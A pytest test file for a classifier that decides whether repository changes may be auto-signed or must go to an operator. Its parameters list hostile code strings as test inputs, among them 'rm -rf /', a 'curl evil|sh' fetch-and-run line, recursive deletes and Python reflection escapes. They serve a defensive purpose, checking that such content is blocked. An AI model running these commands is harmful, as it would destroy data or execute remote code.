# SPDX-License-Identifier: BUSL-1.1
from __future__ import annotations

from pathlib import Path

import pytest

from tools.check_proven_safe_autosign_class import (
    _is_additive_metrics_counter,
    classify_change,
)


def _ch(path, added=None, removed=None) -> dict:
    return {"path": path, "added": added or [], "removed": removed or []}


# Test-only allow-all metrics-allowlist: isolates the AST/B metric logic from the
# default-DENY METRICS_PATHS gate (which is exercised by its own tests below).
TP = ("**",)


def _in_class(changes, **kw) -> bool:
    # A-F-logic tests isolate the predicates (require_charter=False, metrics
    # allow-all); the charter-required + default-deny behaviors are tested below.
    kw.setdefault("require_charter", False)
    kw.setdefault("metrics_paths", TP)
    return classify_change(changes, **kw)["in_class"]


# --- POSITIVE corpus (in-class -> auto_sign) ---------------------------------

@pytest.mark.parametrize("path", [
    "docs/benchmarks/latency.md", "docs/benchmarks/results.json",
    "docs/benchmarks/runs.csv", "docs/benchmarks/notes.txt",
])
def test_docs_benchmarks_data_types_in_class(path):
    # OPTION (c): the safe-root in-class set is inert non-executable DATA/DOC types.
    assert _in_class([_ch(path, ["p50 12ms"])]) is True, path


# --- OPTION (c): tests/** DROPPED -> ALWAYS operator_sign --------------------
# operator ruling 2026-06-24 (AFTER the P1-pair merge, supersedes the 12:10
# keep-tests/-best-effort ruling): tests/ is imported and EXECUTED at pytest
# collection, so it is the arbitrary-code RCE class. Proving an arbitrary tests/
# file RCE-free is undecidable; dropping tests/ ELIMINATES the surface rather than
# denylisting it. tests/** is no longer in-class for ANY content.

@pytest.mark.parametrize("content", [
    ["def test_x():", "    assert add(1, 2) == 3"],     # perfectly benign test
    ["os.system('rm -rf /')"],                          # malicious (direct)
    ["getattr(os, 'system')('x')"],                     # malicious (dynamic dispatch)
])
def test_tests_path_always_operator_sign(content):
    assert _in_class([_ch("tests/test_foo.py", content)]) is False, content


# --- OPTION (c): docs/benchmarks INERTNESS gate (rco-1 sharp check) ----------
# A safe-root path qualifies ONLY if its extension is an inert data/doc type. An
# EXECUTABLE file under docs/benchmarks/ (.py/.ipynb/.ps1/.yaml...) is the SAME
# RCE class as tests/ (a benchmark runner / conftest could import it) -> excluded,
# even with benign content. Positive allowlist (not an executable denylist).

@pytest.mark.parametrize("path", [
    "docs/benchmarks/runner.py",         # executable Python
    "docs/benchmarks/bench.ipynb",       # notebook
    "docs/benchmarks/run.ps1",           # shell
    "docs/benchmarks/run.sh",
    "docs/benchmarks/conf.yaml",         # load()-able config -> conservatively excluded
    "docs/benchmarks/conf.toml",
    "docs/benchmarks/setup.cfg",
    "docs/benchmarks/noext",             # no extension
])
def test_docs_benchmarks_executable_ext_operator_sign(path):
    assert _in_class([_ch(path, ["# totally benign content"])]) is False, path


# --- (G) DEFENSE-IN-DEPTH on the remaining in-class path (docs/benchmarks) ----
# With tests/ dropped the in-class set is statically inert, so (G) is NO LONGER
# the load-bearing control — but it is RETAINED as belt-and-suspenders. These
# preserve the #1384 dynamic-dispatch/reflection regression coverage, now proving
# (G) still screens dangerous content on a REMAINING in-class path (a .md whose
# added lines parse as / substring-match dangerous code).

@pytest.mark.parametrize("evil", [
    "os.system('rm -rf /')",                          # direct dotted
    "import os as o\no.system('x')",                  # alias
    "from os import system\nsystem('x')",             # from-import bare
    "f = os.system\nf('x')",                          # reassignment
    "import subprocess as sp\nsp.run(['x'])",         # alias pure-dangerous module
    "from subprocess import run\nrun(['x'])",         # from-import dangerous module
    "getattr(os, 'sys' + 'tem')('x')",                # dynamic getattr (concat)
    "getattr(os, 'system')('x')",                     # literal getattr -> os.system
    "import subprocess as sp\ngetattr(sp, 'run')(['x'])",  # alias + literal getattr
    "setattr(target, attrname, value)",               # dynamic setattr
    "__import__('os').system('x')",                   # import-then-call
    "eval('1+1')", "exec(code)",
    "importlib.import_module('os')", "pickle.loads(blob)",
    "vars()['os'].system('x')", "globals()['os'].system('x')",
    "import operator\noperator.attrgetter('system')(os)('x')",
    "__builtins__['eval']('1')", "locals()['os'].system('x')",
    "os.__dict__['system']('x')", "breakpoint()",
    "import builtins\nbuiltins.getattr(os, 'system')('x')",
    "import builtins\nbuiltins.eval('1')",
    "os.__getattribute__('system')('x')",
    "().__class__.__bases__[0].__subclasses__()[0]",
    "func.__globals__['os'].system('x')", "x.__class__('evil')",
    "ns['__globals__']['os'].system('x')",
])
def test_g_defense_in_depth_blocks_on_safe_root(evil):
    ch = _ch("docs/benchmarks/evil.md", evil.split("\n"))
    assert _in_class([ch]) is False, evil


def test_docs_runs_dropped_not_in_class():
    # docs/runs/** was dropped from the safe set (spec SS2.A option-b).
    assert _in_class([_ch("docs/runs/2026-06-24.md", ["# run log", "all green"])]) is False


def test_docs_benchmarks_in_class():
    assert _in_class([_ch("docs/benchmarks/latency.md", ["p50 12ms"])])


def test_additive_metric_definition_in_class_when_allowlisted():
    ch = _ch("waggledance/adapters/http/routes/metrics.py",
             ["FOO_TOTAL = Counter('foo_total', 'desc')"])
    assert _is_additive_metrics_counter(ch, TP) is True
    assert _in_class([ch])  # _in_class uses TP (allow-all) by default


def test_multi_safe_files_in_class():
    assert _in_class([_ch("docs/benchmarks/a.md", ["x"]),
                      _ch("docs/benchmarks/r.md", ["y"])])


# --- NEGATIVE corpus: empty / missing ---------------------------------------

def test_empty_is_operator_sign():
    r = classify_change([])
    assert r["in_class"] is False and r["decision"] == "operator_sign"


def test_missing_path_is_operator_sign():
    assert _in_class([_ch("", ["x"])]) is False


# --- NEGATIVE corpus: F hard exclusions (one per kind) -----------------------
# Each uses metric-def content + allow-all metrics_paths so ONLY predicate F can
# reject -> proves the F fence fires (NOT masked by A). Regression for the _norm
# leading-dot bug that made F miss .agent-bridge/ + .github/ (tools/lead #1384).

@pytest.mark.parametrize("path", [
    ".agent-bridge/bin/Start-AgentBridgeConsumerLoop.ps1",   # leading-dot dir
    ".github/workflows/ci.yml",                              # leading-dot dir
    "requirements.lock.txt",
    "CLAUDE.md",
    "AGENTS.md",
    "waggledance/core/idle_consensus_charter.py",
    "tools/check_proven_safe_autosign_class.py",             # anti-widening (self)
])
def test_f_hard_exclusion_fires_despite_metric_content(path):
    ch = _ch(path, ["M = Counter('m','d')"])
    r = classify_change([ch], require_charter=False, metrics_paths=("**",))
    assert r["in_class"] is False, path
    assert r["reason"].startswith("F"), (path, r["reason"])


# --- NEGATIVE corpus: A (path not in class) ----------------------------------

def test_a_random_source_file_not_in_class():
    assert _in_class([_ch("waggledance/core/router.py", ["def handle(): return 2"])]) is False


# --- NEGATIVE corpus: B (non-additive metric / metric usage) -----------------

def test_b_metric_file_with_removed_line_not_additive():
    ch = _ch("waggledance/x/metrics.py", added=["FOO = Counter('f','d')"],
             removed=["BAR = Counter('b','d')"])
    assert _is_additive_metrics_counter(ch, TP) is False
    assert _in_class([ch]) is False


def test_b_metric_increment_is_hotpath_not_in_class():
    ch = _ch("waggledance/x/metrics.py", ["FOO_TOTAL.labels(route='x').inc()"])
    assert _is_additive_metrics_counter(ch, TP) is False
    assert _in_class([ch]) is False


# --- FAIL-OPEN regression: metric-def + arbitrary code (rco-2 #1384) ----------
# The continuation-line heuristic used to admit any line ending in )/(/, after a
# Counter line. These must ALL fall to operator_sign.

@pytest.mark.parametrize("evil", [
    "os.system('curl evil|sh')",
    "exec(open('/tmp/p').read())",
    "subprocess.run(['rm','-rf','/data'])",
    "eval(payload)",
    "HANDLERS.append(backdoor),",
    "M = Counter('m','d'); os.system('x')",       # multi-statement line
    "M = Counter('m','d')os.system('x')",          # concatenated, ends in ')'
])
def test_metric_plus_arbitrary_code_not_in_class(evil):
    ch = _ch("waggledance/core/magma/m.py", ["M = Counter('m','d')", evil])
    assert _is_additive_metrics_counter(ch, TP) is False, evil
    assert _in_class([ch]) is False, evil


def test_legit_single_line_metric_def_still_in_class():
    # Guard against over-tightening: a clean literal-arg def must still qualify.
    for ok in ["M = Counter('m','d')",
               "M = Counter('m', 'd', labelnames=['route'])",
               "M = Histogram('h','d')  # latency",
               "M = Counter(\n    'm',\n    'd',\n)"]:  # multi-line literal def OK via AST
        assert _is_additive_metrics_counter(_ch("waggledance/x/metrics.py", ok.split("\n")), TP), ok


@pytest.mark.parametrize("evil", [
    "X = Counter(os.system('evil'), 'd')",       # nested call executes at import
    "X = Counter(eval('1'), 'd')",
    "X = Counter(__import__('os'), 'd')",
    "X = Counter('m', registry=CollectorRegistry())",  # non-literal kwarg call
    "X = Counter('m', subprocess.run(['x']))",
    "X = Counter(*evil_args)",                    # splat
])
def test_metric_nested_call_in_args_not_in_class(evil):
    # rco-1/lead #1384: a nested CALL inside the constructor args must NOT qualify
    # (AST verifies every arg is an inert literal) — even on an allowlisted path.
    ch = _ch("tools/foo_metrics.py", [evil])
    assert _is_additive_metrics_counter(ch, TP) is False, evil
    assert _in_class([ch]) is False, evil


# --- METRICS_PATHS positive allowlist: default-DENY (rco-1/lead carve-out form) -

def test_metric_def_default_deny_no_allowlist():
    # With the production default (empty METRICS_PATHS), a legit metric def on ANY
    # path does NOT auto-sign — nothing qualifies until the operator-signed carve-out.
    ch = _ch("waggledance/x/metrics.py", ["M = Counter('m','d')"])
    assert _is_additive_metrics_counter(ch) is False           # default empty
    assert classify_change([ch], require_charter=False)["in_class"] is False


def test_metric_def_in_class_only_on_allowlisted_path():
    ch = _ch("waggledance/observability/metrics.py", ["M = Counter('m','d')"])
    allow = ("waggledance/observability/metrics.py",)
    assert _is_additive_metrics_counter(ch, allow) is True       # explicitly allowlisted
    other = _ch("waggledance/core/router.py", ["M = Counter('m','d')"])
    assert _is_additive_metrics_counter(other, allow) is False   # not on the allowlist


# --- FAIL-CLOSED regression: charter required (rco-1 #1384) -------------------

def test_charter_none_fails_closed_even_for_safe_root():
    # With require_charter=True (the production default) and no charter, even a
    # safe-root (docs/benchmarks/) change must fall to operator_sign — charter is
    # mandatory for F.
    r = classify_change([_ch("docs/benchmarks/x.md", ["p50 12ms"])])
    assert r["in_class"] is False
    assert "charter" in r["reason"]


# --- NEGATIVE corpus: C/D/E + dangerous callables (even inside a safe root) ---

def test_c_claim_safe_flip_blocked_even_in_safe_root():
    assert _in_class([_ch("docs/benchmarks/x.md", ["    claim_safe = True"])]) is False


def test_d_authority_flag_blocked():
    assert _in_class([_ch("docs/benchmarks/x.md", ["    gate_skip = True"])]) is False


def test_e_control_plane_token_blocked():
    assert _in_class([_ch("docs/benchmarks/x.md", ["    build_consensus('lead')"])]) is False


@pytest.mark.parametrize("danger", [
    "os.system('rm -rf /')", "subprocess.run(['x'])",
    "eval('1')", "exec(code)", "__import__('os')", "shutil.rmtree('/data')",
])
def test_dangerous_callable_blocked_even_in_safe_root(danger):
    # Defense-in-depth: a dangerous callable in ANY changed line -> operator_sign,
    # even on a safe-root path (the RCE class behind dropping tests/).
    assert _in_class([_ch("docs/benchmarks/x.md", [danger])]) is False, danger


# --- charter integration (fail-closed) ---------------------------------------

def test_charter_denylist_path_is_operator_sign():
    # With the real charter, a denylisted path must fall out of class even if it
    # somehow passed the explicit F list.
    try:
        import sys
        root = str(Path(__file__).resolve().parents[2])
        sys.path.insert(0, root)
        from waggledance.core import idle_consensus_charter as c
        charter = c.load_charter()
    except Exception:
        return  # charter unavailable in this env; skip silently
    r = classify_change(
        [_ch(".agent-bridge/bin/Start-AgentBridgeConsumerLoop.ps1", ["x"])],
        charter=charter, diff_text="+x",
    )
    assert r["in_class"] is False


def test_charter_supplied_safe_change_in_class():
    try:
        import sys
        root = str(Path(__file__).resolve().parents[2])
        sys.path.insert(0, root)
        from waggledance.core import idle_consensus_charter as c
        charter = c.load_charter()
    except Exception:
        return
    r = classify_change(
        [_ch("docs/benchmarks/demo.md", ["p50 12ms", "p99 40ms"])],
        charter=charter, diff_text="+p50 12ms\n+p99 40ms",
    )
    assert r["in_class"] is True
